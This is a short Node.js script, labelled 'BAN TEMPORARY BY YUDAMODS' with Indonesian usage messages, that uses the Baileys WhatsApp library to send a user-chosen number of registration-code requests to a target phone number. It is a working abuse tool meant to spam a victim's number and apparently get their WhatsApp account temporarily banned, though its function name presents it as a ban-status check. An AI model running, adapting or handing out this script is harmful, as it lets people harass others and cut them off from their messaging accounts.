const pino = require('pino');
const fs = require('fs');

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const start = async () => {

  const { state, saveCreds } = await useMultiFileAuthState('.rey');

  const client = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' }, { level: 'property' })
  });

  const checkBanStatus = async (phoneNumber, ddi, number) => {
    const fullNumber = '+' + phoneNumber;
    try {
      const res = await client.requestRegistrationCode({
        phoneNumber: fullNumber,
        phoneNumberCountryCode: ddi,
        phoneNumberNationalNumber: number,
        phoneNumberMobileCountryCode: 724
      });
      console.clear();
      console.log('Nomor tidak keban:', res); 
   } catch (error) {
      console.log('Nomor keban:', error);
      console.clear();
      console.log(error);
    }
  };

  console.clear();
  console.log('');
  console.log('BAN TEMPORARY BY YUDAMODS');
  console.log('');
  console.log('Cara penggunaan: node index <kode negara> <nomor tanpa kode negara> <jumlah spam>');
  
  if (process.argv.length < 5) {
    console.log('ERROR: Masukkan kode negara, nomor, dan jumlah percobaan.');
    return;
  }

  const ddi = process.argv[2];
  const number = process.argv[3];
  const attemptCount = parseInt(process.argv[4]);

  if (isNaN(attemptCount) || attemptCount <= 0) {
    console.log('ERROR: Jumlah percobaan harus berupa angka positif.');
    return;
  }

  const phoneNumber = ddi + number;

  for (let i = 0; i < attemptCount; i++) {
    checkBanStatus(phoneNumber, ddi, number);
  }

  console.log('');
};

start();
